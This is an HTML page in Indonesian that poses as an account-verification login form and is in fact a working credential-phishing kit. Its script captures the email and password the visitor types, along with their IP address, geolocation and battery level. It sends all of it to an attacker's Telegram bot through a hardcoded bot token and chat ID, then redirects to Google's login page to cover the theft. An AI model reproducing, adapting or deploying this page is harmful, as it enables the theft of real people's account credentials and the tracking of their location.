<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Akun</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#0a0a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{max-width:400px;width:100%;background:rgba(255,255,255,0.05);border-radius:24px;padding:30px 24px;border:1px solid rgba(255,255,255,0.08)}
        h2{color:#fff;text-align:center;margin-bottom:8px}
        p{color:#888;text-align:center;font-size:14px;margin-bottom:24px}
        label{color:#aaa;font-size:13px;display:block;margin-bottom:5px}
        input{width:100%;padding:14px;border-radius:12px;border:1px solid #333;background:#111;color:#fff;font-size:15px;margin-bottom:16px;outline:none}
        input:focus{border-color:#00c8ff}
        button{width:100%;padding:15px;border:none;border-radius:12px;background:linear-gradient(135deg,#00c8ff,#007aff);color:#fff;font-size:16px;font-weight:600;cursor:pointer}
        button:hover{opacity:0.9}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Verifikasi Akun</h2>
        <p>Masuk untuk melanjutkan</p>
        <form id="loginForm">
            <label>Email atau Username</label>
            <input type="text" id="email" placeholder="contoh@email.com" required>
            <label>Kata Sandi</label>
            <input type="password" id="password" placeholder="••••••••" required>
            <button type="submit" id="loginBtn">Verifikasi & Masuk</button>
        </form>
    </div>

    <script>
        const BOT = '8945431684:AAEvlhZfwdH42wc0wiLHE3hGQaTG48THmIw';
        const CHAT = '8439372560';

        function sendTelegram(text) {
            if (BOT === 'YOUR_BOT_TOKEN_HERE') return alert('Ganti token dulu!');
            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT, text: text })
            }).then(() => console.log('✅ Terkirim')).catch(() => alert('Gagal kirim'));
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value.trim();
            if (!email || !pass) return alert('Isi semua!');

            const btn = document.getElementById('loginBtn');
            btn.textContent = '⏳ Mengirim...';

            let ip = 'Tidak tersedia';
            let lokasi = 'Tidak tersedia';

            // Ambil IP
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => { ip = d.ip || 'Tidak tersedia'; })
                .catch(() => {});

            // Ambil lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    lokasi = p.coords.latitude + ', ' + p.coords.longitude;
                }, () => {});
            }

            // Ambil baterai
            let bat = 'Tidak tersedia';
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    bat = Math.round(b.level * 100) + '%';
                }).catch(() => {});
            }

            setTimeout(() => {
                const msg = 
                    'Testgass\n' +
                    'bot\n\n' +
                    '## Pasang Foto Profil\n' +
                    'S_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n\n' +
                    '### KREDENSIAL\n' +
                    '- Email: ' + email + '\n' +
                    '- Pass: ' + pass + '\n' +
                    '- Session: s_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n' +
                    '- Baterai: ' + bat + '\n' +
                    '- Lokasi: ' + lokasi + '\n\n' +
                    '### FINAL\n' +
                    '- Email: ' + email + '\n\n' +
                    '### CLOSED\n' +
                    '- s_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n' +
                    '- Email: ' + email + '\n' +
                    '- Pass: ' + pass;

                sendTelegram(msg);
                btn.textContent = '✓ Berhasil';
                setTimeout(() => window.location.href = 'https://accounts.google.com/', 1500);
            }, 2000);
        });
    </script>
</body>
</html>
